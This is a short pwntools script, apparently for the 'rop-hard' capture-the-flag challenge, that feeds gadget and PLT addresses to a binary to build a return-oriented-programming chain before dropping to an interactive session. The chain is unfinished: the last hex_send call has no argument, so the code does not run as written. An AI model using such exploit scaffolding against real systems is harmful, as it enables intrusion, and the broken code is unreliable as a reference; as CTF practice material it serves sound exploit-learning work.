from pwn import *

DEBUG = True

IP = "rop-hard.pwn.wanictf.org"
PORT = 9005
BINPATH = "./pwn05"

if DEBUG:
    context.log_level = "DEBUG"
    p = process(BINPATH)
else:
    p = remote(IP, PORT)

def main():
    p.recvuntil(">")

def hex_send(v):
    p.sendline("1")
    p.sendlineafter(":", hex(v))

puts_plt = 0x4010D0
read_plt = 0x401120
prdir = 0x401287
prsirr = 0x401611

main()
hex_send(prdir)
hex_send(read_plt)
hex_send(puts_plt)
hex_send(prdir)
hex_send()



p.interactive()
